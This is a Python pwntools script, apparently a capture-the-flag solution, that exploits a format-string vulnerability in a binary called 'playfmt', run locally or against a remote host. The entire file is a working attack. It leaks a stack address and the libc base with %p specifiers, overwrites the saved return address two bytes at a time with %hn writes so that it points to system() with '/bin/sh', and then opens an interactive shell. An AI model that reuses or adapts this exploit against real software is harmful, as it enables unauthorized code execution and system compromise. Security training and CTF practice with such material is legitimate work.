#!/usr/bin/env python
from pwn import *
import sys
context.log_level="debug"
#context.log_level="info"
code=ELF("./playfmt",checksec=False)
context.terminal = ['gnome-terminal','-x','sh','-c']
context.arch = code.arch
if len(sys.argv)>2:
    con=remote(sys.argv[1],int(sys.argv[2]))
    libc=ELF("./libc.so")
elif len(sys.argv)>1:
    libc = ELF(sys.argv[1])
    con = code.process(env = {"LD_PRELOAD":sys.argv[1]})
else:
    con=code.process()
    if(context.arch == "amd64"):
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    else:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6")

def write_word(offset,data):
    global stack 
    target_value =  stack-offset
    # using existing pointer to write target addr to stack
    payload = "%"+str(target_value&0xffff)+"c%6$hnaaa\x00"
    con.send(payload)
    con.recvuntil("aaa")
    # overwrite addr we want
    payload = "%"+str(data)+"c%10$hnaaa\x00"
    con.send(payload)
    con.recvuntil("aaa")
def write_dword(offset,data):
    write_word(offset,data&0xffff)
    write_word(offset-2,data>>16)
def z(commond=""):
    gdb.attach(con,commond)
def exploit():
    global stack
    con.recvuntil('Server\n')
    con.recvline()
    #leak stack addr and libc base
    con.sendline("%6$paaa%15$p")
    stack = con.recvuntil("aaa")[:-3]
    stack = int(stack,16)
    libc.address = int(con.recv(10),16)-247-libc.symbols['__libc_start_main']
    #overwrite return address to get shell 
    write_dword(0xc,libc.symbols['system'])
    write_dword(0xc-8,libc.search("/bin/sh").next())
    # return 
    con.send("quit\x00")
exploit()
con.interactive()    
